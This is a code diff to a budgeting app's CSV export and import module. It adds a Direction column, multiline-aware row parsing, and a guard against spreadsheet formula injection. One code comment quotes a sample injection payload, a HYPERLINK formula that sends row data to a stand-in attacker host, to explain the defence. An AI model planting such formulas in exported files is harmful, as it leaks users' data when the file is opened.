@@ -149,16 +149,101 @@ export function parseStatement(text: string): ParseResult {
 // bank statement, this format is precise: it carries Category and Kind, so we
 // parse it exactly (preserving both) instead of guessing.
 
-/** The header row every group export starts with. Also its detection signature. */
-export const GROUP_EXPORT_HEADER = 'Date,Group,Category,Kind,Amount,Note';
+/**
+ * The header row every group export starts with. Also its detection signature.
+ *
+ * `Direction` is new, and it is the fix for a re-import that reversed money.
+ * Without it the parser inferred direction from `Kind` alone — and a settlement is
+ * not inherently one way or the other. "Rahul sent me ₹5,000" came back as ₹5,000
+ * PAID OUT, so `CASH_TOTALS_SQL` moved it from `+settledIn` to `−settledOut` and
+ * cash was wrong by ₹10,000, feeding Safe-to-Spend, the health score and the
+ * overspend raid. Exporting and re-importing is a normal thing to do when moving
+ * phones without a `.bsbackup`.
+ */
+export const GROUP_EXPORT_HEADER = 'Date,Group,Category,Kind,Direction,Amount,Note';
+
+/**
+ * The pre-Direction header. Files written before this still import — they are
+ * somebody's data — and fall back to the old inference, which is right for every
+ * kind except an inbound settlement.
+ */
+export const GROUP_EXPORT_HEADER_V1 = 'Date,Group,Category,Kind,Amount,Note';
 
 /**
  * Wrap a field in double quotes, escaping embedded quotes — the exact inverse of
  * {@link splitCsvLine}. Every quoted field an exporter writes must go through this:
  * an unescaped `"` terminates the field early and shifts every later column.
+ *
+ * It also neutralises **formula injection**. Excel, Numbers and Sheets evaluate a
+ * quoted field that begins with `=`, `+`, `-`, `@`, tab or CR, so a note reading
+ * `=HYPERLINK("https://evil.example/"&A1,"Open")` exfiltrates the row the moment
+ * the exported file is opened. Notes are free multiline text
+ * (`NoteSheet`, `VoiceEntrySheet`), and category and group names are user-supplied
+ * too. A leading apostrophe is the standard defence: spreadsheets treat the field
+ * as text, and every CSV parser — including {@link splitCsvLine} — reads it back
+ * as an ordinary character.
+ *
+ * The apostrophe is in the guarded set too, so that {@link csvUnguard} is an exact
+ * inverse: without it a note that genuinely begins `'=` would come back as `=`,
+ * and the fix for a security hole would quietly edit people's notes.
  */
+const CSV_FORMULA_LEAD = /^['=+\-@\t\r]/;
+
 export function csvQuote(s: string | null | undefined): string {
-  return `"${(s ?? '').replace(/"/g, '""')}"`;
+  const raw = s ?? '';
+  const guarded = CSV_FORMULA_LEAD.test(raw) ? `'${raw}` : raw;
+  return `"${guarded.replace(/"/g, '""')}"`;
+}
+
+/**
+ * Undo {@link csvQuote}'s formula guard. Only ever applied to OUR OWN export
+ * format — a third-party CSV was never guarded, so stripping there would be
+ * editing someone else's data.
+ */
+export function csvUnguard(s: string): string {
+  return s.startsWith("'") && CSV_FORMULA_LEAD.test(s.slice(1)) ? s.slice(1) : s;
+}
+
+/**
+ * Split a whole CSV into rows, honouring newlines INSIDE quoted fields.
+ *
+ * `parseBudgetSplitExport` used to split on newlines and only then honour quotes,
+ * which tore any row whose note contained one — valid RFC-4180 that this app's own
+ * exporter produces, because the note field is `multiline`. The first half failed
+ * the column count and the second parsed as garbage, so the transaction was lost
+ * on re-import and only the aggregate "N skipped" count reported it.
+ */
+export function splitCsvRows(text: string): string[][] {
+  const rows: string[][] = [];
+  let row: string[] = [];
+  let cur = '';
+  let inQuotes = false;
+  let started = false;   // distinguishes a real empty final field from a trailing newline
+
+  const endField = () => { row.push(cur); cur = ''; };
+  const endRow = () => {
+    if (started) { endField(); rows.push(row); row = []; }
+    started = false;
+  };
+
+  const src = (text ?? '').replace(/^\uFEFF/, '');
+  for (let i = 0; i < src.length; i++) {
+    const ch = src[i];
+    if (inQuotes) {
+      if (ch === '"') {
+        if (src[i + 1] === '"') { cur += '"'; i++; } else inQuotes = false;
+      } else cur += ch;
+      continue;
+    }
+    if (ch === '"') { inQuotes = true; started = true; continue; }
+    if (ch === ',') { endField(); started = true; continue; }
+    if (ch === '\r') continue;
+    if (ch === '\n') { endRow(); continue; }
+    cur += ch;
+    started = true;
+  }
+  endRow();
+  return rows;
 }
 
 /** Split one CSV line, honouring double-quoted fields and "" escapes. */
@@ -185,10 +270,21 @@ export function splitCsvLine(line: string): string[] {
   return out;
 }
 
-/** First non-empty line matches our export header (BOM-tolerant, case-insensitive). */
+/**
+ * First non-empty line matches one of our export headers (BOM-tolerant,
+ * case-insensitive).
+ *
+ * Both versions, because a file written before `Direction` existed is still
+ * somebody's data and must not silently fall through to the generic
+ * bank-statement heuristic \u2014 which loses Category and Kind and reports every row
+ * as a guessed expense.
+ */
 export function isBudgetSplitExport(text: string): boolean {
   const first = (text ?? '').replace(/^\uFEFF/, '').split(/\r?\n/).map(l => l.trim()).find(Boolean);
-  return !!first && first.toLowerCase() === GROUP_EXPORT_HEADER.toLowerCase();
+  if (!first) return false;
+  const header = first.toLowerCase();
+  return header === GROUP_EXPORT_HEADER.toLowerCase()
+    || header === GROUP_EXPORT_HEADER_V1.toLowerCase();
 }
 
 function normalizeKind(field: string): TxnKind {
@@ -212,29 +308,56 @@ function parseExportDate(field: string): number {
 
 /** Parse a BudgetSplit group-export CSV. Category and Kind are preserved. */
 export function parseBudgetSplitExport(text: string): ParseResult {
-  const lines = (text ?? '').replace(/^\uFEFF/, '').split(/\r?\n/).map(l => l.trim());
+  // Tokenised over the whole text, so a note containing a newline stays one row.
+  const all = splitCsvRows(text);
   const rows: ParsedRow[] = [];
   let skipped = 0;
-  let headerSeen = false;
 
-  for (const line of lines) {
-    if (!line) continue;
-    if (!headerSeen && line.toLowerCase() === GROUP_EXPORT_HEADER.toLowerCase()) { headerSeen = true; continue; }
+  // Which layout this file is in, decided once from its header rather than from
+  // each row's column count \u2014 a note with a comma in it is quoted, so counting
+  // fields per row would be guessing.
+  const headerRow = all.find(r => r.some(f => f.trim()));
+  const header = (headerRow ?? []).map(f => f.trim().toLowerCase()).join(',');
+  const hasDirection = header === GROUP_EXPORT_HEADER.toLowerCase();
+  const isHeader = hasDirection || header === GROUP_EXPORT_HEADER_V1.toLowerCase();
 
-    const fields = splitCsvLine(line);
-    if (fields.length < 5) { skipped += 1; continue; }
-    const [dateStr, , categoryStr, kindStr, amountStr, noteStr = ''] = fields;
+  for (const fields of all) {
+    if (fields.length === 0 || !fields.some(f => f.trim())) continue;
+    if (isHeader && fields === headerRow) continue;
+
+    const min = hasDirection ? 6 : 5;
+    if (fields.length < min) { skipped += 1; continue; }
+
+    const [dateStr, , categoryStr, kindStr, ...rest] = fields;
+    const directionStr = hasDirection ? rest[0] : '';
+    const amountStr = hasDirection ? rest[1] : rest[0];
+    const noteStr = (hasDirection ? rest[2] : rest[1]) ?? '';
 
     const amount = parseToPaise(amountStr);
     if (!(amount > 0)) { skipped += 1; continue; }
 
     const kind = normalizeKind(kindStr);
-    const category = categoryStr.trim() || undefined;
-    const note = noteStr.trim();
+    // Unguarded, because this is our own format and `csvQuote` wrote the guard.
+    const category = csvUnguard(categoryStr.trim()) || undefined;
+    const note = csvUnguard(noteStr.trim());
     const description = note || category || 'Imported';
-    const direction: ParsedDirection = kind === 'income' ? 'credit' : 'debit';
+    /*
+     * Read it when the file carries it. A settlement is not inherently one way,
+     * and inferring `debit` from the kind is what turned "Rahul sent me \u20B95,000"
+     * into \u20B95,000 paid out on re-import.
+     *
+     * The old fallback stays for files written before the column existed: it is
+     * right for every kind except an inbound settlement, which is the best that
+     * can be done with what those files contain.
+     */
+    const direction: ParsedDirection = hasDirection
+      ? (directionStr.trim().toLowerCase() === 'credit' ? 'credit' : 'debit')
+      : (kind === 'income' ? 'credit' : 'debit');
 
-    rows.push({ date: parseExportDate(dateStr), amount, description, direction, kind, category, raw: line });
+    rows.push({
+      date: parseExportDate(dateStr), amount, description, direction, kind, category,
+      raw: fields.join(','),
+    });
   }
 
   return { rows, skipped };
